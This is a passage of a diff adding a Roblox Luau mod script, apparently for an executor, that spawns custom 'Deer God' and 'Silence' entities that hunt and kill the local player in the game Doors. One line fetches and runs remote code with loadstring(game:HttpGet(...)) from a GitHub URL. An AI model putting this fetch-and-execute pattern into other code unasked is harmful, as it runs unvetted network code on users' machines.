+                            if ray.Instance.Parent == game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:GetAttribute("Hiding") == false and killed == false or ray.Instance.Parent.Parent == game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:GetAttribute("Hiding") == false and killed == false then 
+                                killed = true
+                                local screen = Instance.new("ScreenGui",game.Players.LocalPlayer.PlayerGui)
+
+                                local background = Instance.new("Frame",screen)
+                                background.AnchorPoint = Vector2.new(0.5,0.5)
+                                background.Size = UDim2.new(10,0,10,0)
+                                background.BackgroundColor3 = Color3.fromRGB(48, 25, 50)
+
+                                local sound = Instance.new("Sound",game.Workspace)
+                                sound.SoundId = "rbxassetid://10483837590"
+                                sound.Volume = 1
+                                sound:play()
+
+                                for i = 1 , 5 do
+                                    background.BackgroundColor3 = Color3.fromRGB(48,25,50)
+                                    task.wait(0.05)
+                                    background.BackgroundColor3 = Color3.fromRGB(0,0,0)
+                                    task.wait(0.05)
+                                end
+
+                                screen:Destroy()
+                                game.Players.LocalPlayer.Character.Humanoid.Health = 0
+                                firesignal(game.ReplicatedStorage.RemotesFolder.DeathHint.OnClientEvent, {"You died to whom you call The Deer God","Closets Wont work! So try running","Its form is incomprehensible to a human upclose...","..-so avoid Eye Contact"},"Blue")
+                                game.ReplicatedStorage.GameStats["Player_".. game.Players.LocalPlayer.Name].Total.DeathCause.Value = "Deer God"
+                            end
+                        end 
+                    end
+                end)
+
+                function moved(model, cframe, speed)
+                    local reached = false
+                    local connection; connection = RunService.Stepped:Connect(function(_, step)
+                        local pivot = model:GetPivot()
+                        local difference = (cframe.Position - pivot.Position)
+                        local unit = difference.Unit
+                        local magnitude = difference.Magnitude
+
+                        if magnitude > 0.1 then
+                            model:PivotTo(pivot + unit * math.min(step * speed, magnitude))
+                        else
+                            connection:Disconnect()
+                            reached = true
+                        end
+                    end)
+                    repeat RunService.Stepped:Wait() until reached
+                end
+
+                game.Workspace.CurrentRooms.ChildAdded:connect(function() 
+                    count -= 1
+                end)
+
+                while true do 
+                    local room = game.Workspace.CurrentRooms:GetChildren()[count]
+                   
+                    if room:FindFirstChild("RoomExit") then
+                        if room:FindFirstChild("nodes") then
+                            for _ , node in room.nodes:GetChildren() do
+                                if node.Parent then
+                                    moved(der,node.CFrame + Vector3.new(0,3,0),20)
+                                end
+                            end
+                        end
+                        if room:FindFirstChild("RoomExit") then
+                            moved(der,room.RoomExit.CFrame,20)
+                        end
+                    end
+                    count += 1
+                    passes += 1
+                    if passes >= 7 or count >= #game.Workspace.CurrentRooms:GetChildren() then
+                        der:Destroy()
+                        soun:Destroy()
+                        CustomMusic:Destroy()
+                        if dergodt == false then
+                            dergodt = true
+                           print("stinky executor doesnt support require")
+                        end
+                        break
+                    end
+                end
+            end
+        end)
+    end
+end)
+
+task.spawn(function()
+    while task.wait(728) do
+        if game.ReplicatedStorage.GameData.LatestRoom.Value ~= 50 then
+            local killed = false
+            local count = 1
+            local RunService = game:GetService("RunService")
+            local achievementGiver = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Doors/Custom%20Achievements/Source.lua"))()
+
+            local silen = game:GetObjects("rbxassetid://18866325954")[1].RushNew
+            silen.Parent = game.Workspace
+            silen.Anchored = true
+            silen.CFrame = game.Workspace.CurrentRooms:GetChildren()[1].RoomEntrance.CFrame
+            task.spawn(function()
+                while silen.Parent do
+                    task.wait(0.1)
+                    local direction = game.Players.LocalPlayer.Character.HumanoidRootPart.Position - silen.Position
+                    local ray = game.Workspace:Raycast(silen.Position , direction.Unit * 50)
+
+                    if ray then
+                        if ray.Instance.Parent == game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:GetAttribute("Hiding") == false and killed == false or ray.Instance.Parent.Parent == game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:GetAttribute("Hiding") == false and killed == false then 
+                            killed = true
+                            local screen = Instance.new("ScreenGui",game.Players.LocalPlayer.PlayerGui)
+
+                            local background = Instance.new("Frame",screen)
+                            background.AnchorPoint = Vector2.new(0.5,0.5)
+                            background.Size = UDim2.new(10,0,10,0)
+                            background.BackgroundColor3 = Color3.fromRGB(48, 25, 50)
+
+                            local sound = Instance.new("Sound",game.Workspace)
+                            sound.SoundId = "rbxassetid://10483837590"
+                            sound.Volume = 1
+                            sound:play()
+
+                            for i = 1 , 5 do
+                                background.BackgroundColor3 = Color3.fromRGB(48,25,50)
+                                task.wait(0.05)
+                                background.BackgroundColor3 = Color3.fromRGB(0,0,0)
+                                task.wait(0.05)
+                            end
+
+                            screen:Destroy()
+                            game.Players.LocalPlayer.Character.Humanoid.Health = 0
+                            firesignal(game.ReplicatedStorage.RemotesFolder.DeathHint.OnClientEvent, {"You died to who you call Silence","Stay as silent as possible when you suspect its coming, so you know when to hide!","Its slow, but hard to hear","so hide!"},"Blue")
+                            game.ReplicatedStorage.GameStats["Player_".. game.Players.LocalPlayer.Name].Total.DeathCause.Value = "Silence"
+                        end
+                    end 
+                end
+            end)
+
+            function movel(model, cframe, speed)
+                local reached = false
+                local connection; connection = RunService.Stepped:Connect(function(_, step)
+                    local pivot = model:GetPivot()
+                    local difference = (cframe.Position - pivot.Position)
+                    local unit = difference.Unit
+                    local magnitude = difference.Magnitude
+
+                    if magnitude > 0.1 then
+                        model:PivotTo(pivot + unit * math.min(step * speed, magnitude))
+                    else
+                        connection:Disconnect()
+                        reached = true
+                    end
+                end)
+                repeat RunService.Stepped:Wait() until reached
+            end
+
+            game.ReplicatedStorage.GameData.LatestRoom.Changed:connect(function() 
+                count -= 1
+            end)
+
+            while true do
+                local room = game.Workspace.CurrentRooms:GetChildren()[count]
+              
+                if room:FindFirstChild("RoomExit") then
+                        if room:FindFirstChild("nodes") then
+                            for _ , node in room.nodes:GetChildren() do
+                                movel(silen,node.CFrame + Vector3.new(0,3,0),30)
+                            end
+                        end
+			if room:FindFirstChild("RoomExit") then
+                        	movel(silen,room.RoomExit.CFrame,20)
+			end
+                end
+                count += 1
+                if count >= #game.Workspace.CurrentRooms:GetChildren() then
+                    silen:Destroy()
+                    break
+                end
+            end
+        end
+    end
+end)
